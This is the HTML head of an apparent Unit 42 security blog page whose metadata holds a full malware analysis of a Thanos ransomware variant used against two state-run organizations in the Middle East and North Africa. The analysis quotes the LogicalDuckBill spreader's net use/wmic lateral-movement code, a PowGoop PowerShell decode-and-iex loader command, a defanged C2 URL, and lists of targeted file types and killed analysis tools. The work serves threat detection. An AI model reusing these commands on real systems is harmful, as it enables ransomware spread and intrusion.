
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/thanos-ransomware/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/thanos-ransomware/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="We observed a variant of the Thanos ransomware that attempted to overwrite the master boot record, a more destructive approach than previous versions."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/thanos-ransomware/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa" />
<meta property="og:description" content="We observed a variant of the Thanos ransomware that attempted to overwrite the master boot record, a more destructive approach than previous versions." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/thanos-ransomware/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Middle East" />
<meta property="article:tag" content="ransomware" />
<meta property="article:tag" content="Thanos" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2020-09-04T13:00:34+00:00" />
<meta property="article:modified_time" content="2020-09-04T12:17:31+00:00" />
<meta property="og:updated_time" content="2020-09-04T12:17:31+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="We observed a variant of the Thanos ransomware that attempted to overwrite the master boot record, a more destructive approach than previous versions." />
<meta name="twitter:title" content="Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/Ransomware-r3d3.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa Comments Feed" href="https://unit42.paloaltonetworks.com/thanos-ransomware/feed/" />
<meta property="og:likes" content="7"/>
<meta property="og:readtime" content="13"/>
<meta property="og:views" content="14,293"/>
<meta property="og:date_created" content="September 4, 2020 at 6:00 AM"/>
<meta property="og:post_length" content="3821"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/Ransomware-r3d3.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa","name":"Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa","description":"We observed a variant of the Thanos ransomware that attempted to overwrite the master boot record, a more destructive approach than previous versions.","url":"https:\/\/unit42.paloaltonetworks.com\/thanos-ransomware\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/thanos-ransomware\/","datePublished":"September 4, 2020","articleBody":"Executive Summary\r\nOn July 6 and July 9, 2020, we observed files associated with an attack on two state-run organizations in the Middle East and North Africa that ultimately installed and ran a variant of the Thanos ransomware. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer \u201c20,000$\u201d into a specified Bitcoin wallet to restore the files on the system. We do not have visibility into the overall impacts of these attacks or whether or not the threat actors were successful in receiving a payment from the victims.\r\n\r\n\r\nFigure 1. Thanos\u2019 ransom note displayed after encrypting files.\u00a0\u00a0\r\nThe ransomware was also configured to overwrite the master boot record (MBR), which is an important component loaded on a system\u2019s hard drive that is required for the computer to locate and load the operating system. The ransomware overwrites the MBR to display the same ransom message as the previously mentioned text file, which is a technique we do not see often. The most notable example we\u2019ve observed involved the Petya ransomware in 2017. Overwriting the MBR is a more destructive approach to ransomware than usual. Victims would have to expend more effort to recover their files \u2013 even if they paid the ransom. Fortunately, in this case, the code responsible for overwriting the MBR caused an exception because the ransom message contained invalid characters, which left the MBR intact and allowed the system to boot correctly. This means that even though the ransomware was configured to overwrite the MBR, the threat actors were unsuccessful in causing the computers they infected with the Thanos ransomware not to boot.\r\n\r\n\r\nFigure 2. Thanos\u2019 ransom note displayed if MBR overwrite was successful.\r\nThe Thanos ransomware was first discussed by Recorded Future in February 2020 when it was advertised for sale on underground forums. The Thanos ransomware has a builder that allows actors to customize the sample with a variety of available settings. The fact Thanos is for sale suggests the likelihood of multiple threat actors using this ransomware. However, we believe with high confidence that the same actor used a Thanos variant in attacks on two state-run organizations in the Middle East and North Africa.\r\n\r\nBased on our telemetry, we first observed Thanos on Jan. 13, 2020, and have seen over 130 unique samples since. We believe the threat actors had prior access to these organizations\u2019 networks, as the samples contained credentials that we believe the actors had stolen from systems on these organizations\u2019 networks prior to the delivery of the ransomware.\r\n\r\nThis particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in order to load Thanos into memory and to run it on the local system. These layers were largely based on code freely available in open source frameworks, such as Sharp-Suite and Donut. One of the layers involved a custom PowerShell that was responsible for spreading Thanos to other systems on the local network using previously mentioned stolen credentials.\r\n\r\nWe analyzed this specific Thanos sample that the actors built for the Middle Eastern and Northern African state-run organizations. We determined that the ransomware was loaded into and run from within memory at these organizations. We found the Thanos variant is functionally very similar to the variant discussed by Fortinet in July 2020. The sample analyzed by Fortinet also contained network-spreading functionality enabled, which included network credentials from another state-run organization in the same municipality as the Middle Eastern state-run organization we observed. The sample analyzed by Fortinet included the same Bitcoin wallet and contact email that we observed. When combined with the targeting of an organization in the same municipality in a similar time frame, this suggests a common actor behind these attacks.\r\n\r\nPalo Alto Networks customers are protected from the attacks discussed in this blog by WildFire, which correctly identifies all related samples as malicious, and Cortex XDR, which blocks the components involved in this ransomware infection.\r\nOverview of Thanos Variant Activity\r\nWe do not know how the actors delivered the Thanos ransomware to the two state-run organizations in the Middle East and North Africa. However, we know the threat group behind the use of these tools had previous access to these networks as they had already obtained valid credentials from the networks. The exact same Thanos sample was used at both of these organizations, which suggests that the same actor created the sample using the Thanos builder.\r\n\r\nThe Thanos sample created for these networks executes several layers before the .NET Thanos ransomware runs on a system, specifically using code from several open source frameworks. The layers start at the top with a PowerShell script that not only loads another PowerShell script as a sub-layer, but also attempts to spread the ransomware to other systems on the network using previously stolen credentials. The PowerShell in the second layer does nothing more than load embedded C# code inline so the initial PowerShell script can execute it. The C# code is the third layer, and it is based on UrbanBishop, which is publicly available as part of the Sharp-Suite framework on GitHub. The UrbanBishop code is responsible for writing shellcode to a remote process and executing it, of which the shellcode is the final layer before running the Thanos ransomware. The shellcode in this case was created by Donut, which is another open source framework that will generate shellcode that can load and execute .NET assemblies in memory.\r\n\r\n\r\nFigure 3. Layers executed to run the Thanos ransomware on the system.\r\n\r\nPowerShell Spreader\r\nThe PowerShell spreader, which we call LogicalDuckBill, has two primary purposes:\r\n\r\n \tLoading and running the Thanos ransomware.\r\n \tSpreading to other systems by copying itself to and executing itself on remote systems.\r\n\r\nThe loader functionality within LogicalDuckBill starts with a base64 encoded PowerShell script that it will decode and run using the IEX command. The PowerShell decoded and executed contains the following code, which effectively loads C# code based on UrbanBishop that LogicalDuckBill will call later to inject shellcode:\r\n\r\n$code = @\"\r\n\r\n[C# code based on UrbanBishop]\r\n\r\n\"@\r\n\r\nAdd-Type -TypeDefinition $code -Language CSharp\r\n\r\nLogicalDuckBill will then check to see if a file named \u201clogdb.txt\u201d or \u201clogdb.txt.locked\u201d exists in the \u201cc:\\\u201d drive before running, which is the method the spreader uses to be sure to only run one instance of the embedded ransomware on each system. We also observed another related sample that looked for \u201clogdbnnn.txt\u201d instead, which is why we call this script LogicalDuckBill. If these files are not present, LogicalDuckBill will write \u201c1\u201d to this text file and then continue to carry out its functionality.\r\n\r\nLogicalDuckBill then creates a \u201cnotepad.exe\u201d process, which it will then iterate through running processes to find the process ID (PID) of the created \u201cnotepad.exe\u201d process. With the PID of the notepad process, the PowerShell script calls the \u201cDo\u201d method in the loaded C# code based on UrbanBishop, which ultimately injects shellcode generated by the Donut framework into the notepad process and executes it. The shellcode then decrypts and loads an embedded .NET executable into memory and executes it, which is the Thanos ransomware payload.\r\n\r\nThe spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection cmdlet to get the remote addresses of the current TCP connections on the system. The code then looks through these remote addresses for those that start with 10., 172. and 192. as the first octet and will iterate through each discovered network by changing the last octet from 1 to 254 in a loop. For each iteration, the script will use the Test-NetConnection cmdlet to see if the script can connect to each remote system over SMB port tcp\/445, and if it can, it uses the net use command to connect to the remote system with previously stolen credentials and mounts the remote system\u2019s C: drive to the local system\u2019s X: drive. The script then uses the copy command to copy itself to the newly mapped X: drive, which effectively copies LogicalDuckBill to the remote system. The script will then use wmic to run process call create on the remote system to run the newly copied LogicalDuckBill sample on the remote system. The spreading functionality finished each iteration by deleting the mapped drive, all of which is carried out by the following code:\r\n\r\nif((Test-NetConnection $tr -Port 445).TcpTestSucceeded){\r\n\r\nnet use x: \\\\[IP address]\\c$ \/user:[Victim Domain]\\[Username] [Password]\r\n\r\ncopy c:\\windows\\update4.ps1 x:\\windows\\update4.ps1\r\n\r\nwmic \/node:[IP address] \/user:[Victim Domain]\\[Username] \/password:[Password] process call create \"powershell -exec bypass -file c:\\windows\\update4.ps1\"\r\n\r\nnet use x: \/del \/y\r\n\r\n}\r\n\r\nThis spreading method in LogicalDuckBill is similar to one found within Thanos\u2019 C# code. However, using the PowerShell script to spread allowed the actors to include previously stolen network credentials when creating the mapped drive and when running the copied PowerShell script using wmic.\r\nThanos Ransomware\r\nThe Thanos ransomware was first observed by Recorded Future in February 2020 when it was advertised for sale on underground forums. The Thanos ransomware has code overlaps with other ransomware variants, such as Hakbit, and has a builder that allows the user to customize the sample with a variety of available settings. This ransomware appears to be still under active development, as we observed newly added functionality in the samples built to run on the Middle Eastern and Northern African state-run organizations compared to the original samples analyzed by Recorded Future. In fact, the Thanos ransomware built to run on these two organizations\u2019 networks was closer in available functionality to the variant discussed by Fortinet in July 2020. The most obvious difference is that the disabling of safe boot discussed by Fortinet is not available in these samples.\r\n\r\nLike other Thanos ransomware samples, the variant built to run on these two organizations\u2019 networks uses a 2048-bit RSA public key to encrypt files whose file extensions match those listed in Table 1. After encrypting the file\u2019s contents, Thanos will add the file extension \u201c.locked\u201d to the file on disk.\r\n\r\n\r\n\r\ndat\r\nppt\r\nmdb\r\nodg\r\nbackup\r\naiff\r\n\r\n\r\ntxt\r\ndoc\r\ndbf\r\nraw\r\npdf\r\nflac\r\n\r\n\r\njpeg\r\ndocx\r\nodb\r\nnef\r\ncert\r\nm4a\r\n\r\n\r\ngif\r\nsxi\r\nmyd\r\nsvg\r\ndocm\r\ncsv\r\n\r\n\r\njpg\r\nsxw\r\nphp\r\npsd\r\nxlsm\r\nsql\r\n\r\n\r\npng\r\nodt\r\njava\r\nvmx\r\ndwg\r\nora\r\n\r\n\r\nphp\r\nhwp\r\ncpp\r\nvmdk\r\nbak\r\nmdf\r\n\r\n\r\ncs\r\ntar\r\npas\r\nvdi\r\nqbw\r\nldf\r\n\r\n\r\ncpp\r\nbz2\r\nasm\r\nlay6\r\nnd\r\nndf\r\n\r\n\r\nrar\r\nmkv\r\nkey\r\nsqlite3\r\ntlg\r\ndtsx\r\n\r\n\r\nzip\r\neml\r\npfx\r\nsqlitedb\r\nlgb\r\nrdl\r\n\r\n\r\nhtml\r\nmsg\r\npem\r\naccdb\r\npptx\r\ndim\r\n\r\n\r\nhtm\r\nost\r\np12\r\njava\r\nmov\r\nmrimg\r\n\r\n\r\nxlsx\r\npst\r\ncsr\r\nclass\r\nxdw\r\nqbb\r\n\r\n\r\nxls\r\nedb\r\ngpg\r\nmpeg\r\nods\r\nrtf\r\n\r\n\r\navi\r\nsql\r\naes\r\ndjvu\r\nwav\r\n7z\r\n\r\n\r\nmp4\r\naccdb\r\nvsd\r\ntiff\r\nmp3\r\n\r\n\r\n\r\n\r\nTable 1. List of extensions of files that Thanos will encrypt. \r\n\r\nThis variant of Thanos writes a ransom note to a file named \u201cHOW_TO_DECYPHER_FILES.txt\u201d to the desktop and all of the folders that contained files that Thanos encrypted. The ransom note, as seen in Figure 2, requests \u201c20,000$\u201d worth of Bitcoin be transferred to a wallet \u201c1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\u201d and a contact email of \u201cjosephnull@secmail.pro\u201d to recover the encrypted files. The contact email and Bitcoin wallet ID were seen by other researchers and organizations in July 2020, as seen in the .HTA ransom note displayed in Fortinet\u2019s blog and several tweets.\r\n\r\n\r\n\r\nThe features and functionality within the Thanos ransomware have been analyzed by other organizations. Instead of rehashing this analysis, we will only discuss the functionality that was enabled within this variant of Thanos that had not been discussed previously. However, we delineate which previously discussed functionalities are disabled and enabled in this variant of Thanos in Tables 2 and 3 respectively.\r\n\r\n\r\n\r\nMax. File Size\r\nProtect Process\r\nDisable FAC\r\n\r\n\r\nPersistence - Melt\r\nWallpaper\r\nStatic Pass\r\n\r\n\r\nDeceiving Msg\r\nImmortal Process\r\nRIPlace\r\n\r\n\r\nUnlock Files\r\nFTP Logger\r\nData Stealer\r\n\r\n\r\nAnti-VM\r\nWake-on-LAN\r\nMax. Steal Size\r\n\r\n\r\nDelay\r\nDelayed Activation\r\nAlternate Algo\r\n\r\n\r\nAMSI Bypass\r\nClient Expiration\r\nDrag and Drop\r\n\r\n\r\n\r\nTable 2. Disabled functionality, which are likely unchecked boxes on the Thanos ransomware builder user interface (UI). \r\n\r\n\r\n\r\nKill Defender\r\nFast Mode\r\nEnhanced Notifications\r\n\r\n\r\nLAN\r\nAntiKill\r\nCustomize Notifications\r\n\r\n\r\n\r\nTable 3. Enabled functionality, which are likely checked boxes on the Thanos ransomware builder UI. \r\n\r\nThe first configuration option enabled that doesn't match the analysis of previous variants of Thanos starts with the code trying to disable User Account Control (UAC) by setting the keys \"LocalAccountTokenFilterPolicy\" and \"EnableLinkedConnections\" in SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System to 1. It then attempts to enumerate local and mapped storage volumes. To enumerate the local volumes, the code creates and runs a batch script that is almost exactly the same as the batch script used by Ragnar Locker ransomware to enumerate the local storage volumes. Ragnar Locker used this script to create a VirtualBox configuration file that sets these volumes as SharedFolders, which allows Ragnar Locker to access the local storage volumes while it runs within a VirtualBox virtual machine, as discussed by Sophos. The Thanos implementation does not write the results to a VirtualBox configuration file. Instead, it just prints the configuration to the screen, but does not save the output. Therefore, we cannot be certain of the purpose of this functionality.\r\n\r\nThe second functionality enabled in this sample that had not been observed in previous Thanos variants involved the ability to overwrite the master boot record (MBR). Once the code checks to see if the operating system version is not \"Windows 10\" or \"Windows 8,\" the code will attempt to open \"\\\\.\\PhysicalDrive0\" and write a 512-byte string to offset 0. The byte array that is written to offset 0 of \"\\\\.\\PhysicalDrive0\" initially has a ransom message of \"Your files are encrypted. Contact us at: get-my-data@protonmail.com...\", but the code will replace this string with the following string before writing to disk:\r\n\r\nDon\\xe2\\x80\\x99t worry, you can return all your files!\\r\\n\\r\\nThe Price to get all things to the normal : 20,000$\\r\\nMy BTC Wallet ID :\\r\\n1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\\r\\n\\r\\nContact: josephnull@secmail.pro\\r\\n\r\n\r\nThe interesting part of the overwriting of the MBR in this specific sample is that it does not work correctly, which can be blamed on either a programming error or the custom message included by the actor. As you can see above, the custom message has the bytes \"\\xe2\\x80\\x99\" for the apostrophe character in unicode, but the code attempts to convert each character using the \"Convert.ToByte\" function to replace a single byte in the initial ransom string. However, the unicode apostrophe character is three bytes long and causes an exception that breaks the MBR overwriting functionality. We confirmed that after changing this single character, the MBR overwriting functionality works, which results in the following being displayed instead of Windows booting correctly:\r\n\r\n\r\n\r\nThe third previously unmentioned functionality in this Thanos sample involves creating a thread that watches for newly connected storage volumes. The code uses a management event watcher that calls a function when a new storage volume is connected using the following WMI query:\r\n\r\nSELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\r\n\r\nWhen the event watcher detects a new storage volume connected, it creates a thread that carries out the file encrypting functionality used by Thanos to encrypt files on the original storage volumes.\r\n\r\nThe last functionality added to this version of Thanos is the ability to detect and kill more analysis tools to evade detection and analysis. The sample will enumerate through running processes and kill those whose names match the following:\r\n\r\n\r\n\r\nhttp analyzer stand-alone\r\nintercepter\r\nprocexp64\r\n\r\n\r\nfiddler\r\nIntercepter-NG\r\nRDG Packer Detector\r\n\r\n\r\neffetech http sniffer\r\nollydbg\r\nCFF Explorer\r\n\r\n\r\nfiresheep\r\nx64dbg\r\nPEiD\r\n\r\n\r\nIEWatch Professional\r\nx32dbg\r\nprotection_id\r\n\r\n\r\ndumpcap\r\ndnspy\r\nLordPE\r\n\r\n\r\nwireshark\r\ndnspy-x86\r\npe-sieve\r\n\r\n\r\nwireshark portable\r\nde4dot\r\nMegaDumper\r\n\r\n\r\nsysinternals tcpview\r\nilspy\r\nUnConfuserEx\r\n\r\n\r\nNetworkMiner\r\ndotpeek\r\nUniversal_Fixer\r\n\r\n\r\nNetworkTrafficView\r\ndotpeek64\r\nNoFuserEx\r\n\r\n\r\nHTTPNetworkSniffer\r\nida64\r\n\r\n\r\n\r\ntcpdump\r\nprocexp\r\n\r\n\r\n\r\n\r\nTable 4. List of tools this Thanos variant will detect and kill to evade detection\r\nPossibly Related Downloader: Introducing PowGoop\r\nWhile we cannot confirm the connection, we believe the actors deploying the Thanos ransomware at the Middle Eastern state-run organization also used a downloader that we call PowGoop. The actors would use the PowGoop downloader to reach out to a remote server to download and execute additional PowerShell scripts. The files existed in the same environment as the LogicalDuckBill sample previously discussed, but we did not observe the actors specifically running both PowGoop and the LogicalDuckBill spreader. Also, as expected, there is very little code overlap between the PowerShell code in this downloader and LogicalDuckBill, as their functionality differs dramatically. The only code overlap is a common variable name $a that both of the scripts use to store the base64 encoded data prior to decoding, which is not a strong enough connection to suggest a common author.\r\n\r\nThe PowGoop downloader has two components: a DLL loader and a PowerShell-based downloader. The PowGoop loader component is responsible for decrypting and running the PowerShell code that comprises the PowGoop downloader. The PowGoop loader DLL that existed in the same environment as LogicalDuckBill had a filename of goopdate.dll that was likely sideloaded by the legitimate and signed Google Update executable. The sideloading process would start with the legitimate GoogleUpdate.exe file loading a legitimate DLL with a name of goopdate86.dll. The sideloading would occur when the goopdate86.dll library loads the goopdate.dll file, which effectively runs the PowGoop loader. We observed the following files that are likely associated:\r\n\r\n\r\n\r\nSHA256\r\nFilename\r\n\r\n\r\nb60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6\r\nGoogleUpdate.exe\r\n\r\n\r\ndea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e\r\ngoopdate86.dll\r\n\r\n\r\na224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8\r\ngoopdate.dll\r\n\r\n\r\nb7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e\r\nconfig.dat\r\n\r\n\r\n\r\nTable 5. List of files associated with the sideloading of the PowGoop downloader\r\n\r\nThe goopdate.dll file is the PowGoop loader, whose functionality exists within an exported function named DllRegisterServer. The goopdate.dll file\u2019s DllEntryPoint function, which would be called if loaded via the sideloading process mentioned above, does nothing more than attempt to run the DllRegisterServer exported function using the following command:\r\n\r\nrundll32.exe &lt;module filename&gt;,DllRegisterServer\r\n\r\nThe functional code in DllRegisterServer reads a file named config.dat, decodes it and runs it as a PowerShell script, which is the PowGoop downloader component. To decode the config.dat file, the DLL builds and executes a PowerShell script using the CreateProcessA function. The PowerShell script built by the PowGoop loader will read the contents of the config.dat file, base64 decode and decrypt the contents using a simple subtract by two cipher and run the result PowGoop downloader script using the IEX command, as seen in the following:\r\n\r\npowershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\\\Users\\\\[username]\\\\Desktop\r\n\r\nconfig.dat;$t =bDd $a;iex($t);\r\n\r\nThe config.dat file we decrypted is the PowGoop downloader that the actors configured to use the following URL as its command and control (C2):\r\n\r\nhttp:\/\/107.174.241[.]175:80\/index.php\r\n\r\nThe PowGoop downloader will communicate with the C2 server via HTTP GET requests to this URL. It will expect the C2 server to respond to requests with base64 encoded data that the script will decode, decompress the decoded data using System.IO.Compression.GzipStream and then decrypt the decompressed data using the same subtract by two cipher used to decrypt the config.dat file. It will first communicate with the C2 to obtain a unique identifier value that the C2 will assign to the compromised system. After obtaining this identifier, the script will continue to communicate with the C2 to obtain Tasks, which the script will decode, decompress, decrypt and run as PowerShell scripts. The script exfiltrates the result of a task to the C2 by encrypting the result using an add by two cipher, compressing the ciphertext and base64 encoding it, and transmitting it to the C2 server using a GET request with the data in the Cookie field of the HTTP request, specifically as the R value.\r\nConclusion\r\nActors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional systems, specifically on networks of two state-run organizations in the Middle East and North Africa. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer \u201c20,000$\u201d into a specified Bitcoin wallet to restore the files on the system.\r\n\r\nWhile the Thanos ransomware is not new, it appears that it is still under active development as the variant used in these attacks contained new functionality. The new functionality included the ability to detect and evade more analysis tools, the enumeration of local storage volumes via a technique used by the Ragnar Locker ransomware and a new capability to monitor for newly attached storage devices.\r\n\r\nMost importantly, this variant of Thanos also included the new ability to overwrite the MBR and display the same ransom message. Overwriting the MBR is a much more destructive approach to ransomware than previously used by Thanos and would require more effort for victims to recover their files even if they paid the ransom.\r\n\r\nPalo Alto Networks customers are protected from the attacks discussed in this blog in the following ways:\r\n\r\n \tAll known Thanos ransomware and LogicalDuckBill samples have malicious verdicts in WildFire.\r\n \tAutoFocus customers can track this ransomware, PowerShell spreading script and the potentially related downloader with the tags Thanos, LogicalDuckBill and PowGoop.\r\n \tCortex XDR blocks Thanos ransomware, LogicalDuckBill and PowGoop.\r\n\r\nIndicators of Compromise\r\nLogicalDuckBill Samples\r\n40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf\r\n\r\n06d5967a6b90b5b5f6a24b5f1e6bfc0fc5c82e7674817644d9c3de61008236dc\r\n\r\ncbb95952001cdc3492ae8fd56701ceff1d1589bcfafd74be86991dc59385b82d\r\n\r\n240e3bd7209dc5151b3ead0285e29706dff5363b527d16ebcc2548c0450db819\r\nThanos Samples\r\n7aa46a296fbebdf3b13d399bf0dbe6e8a8fbcbc9ba696e5698326494b0da2e54\r\n58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f\r\n\r\nc460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850\r\n\r\nae66e009e16f0fad3b70ad20801f48f2edb904fa5341a89e126a26fd3fc80f75\r\n\r\n5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d\r\nPowGoop Samples\r\nb60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google installer, GoogleUpdate.exe)\r\n\r\ndea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e (legitimate Google DLL, goopdate86.dll)\r\n\r\na224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 (PowGoop Loader, goopdate.dll)\r\n\r\nb7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e PowGoop Downloader, config.dat)\r\nPowGoop Infrastructure\r\n107.174.241[.]175\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2020\/09\/Ransomware-r3d3.png","width":150,"height":75},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"108595","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=108595' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthanos-ransomware%2F" />
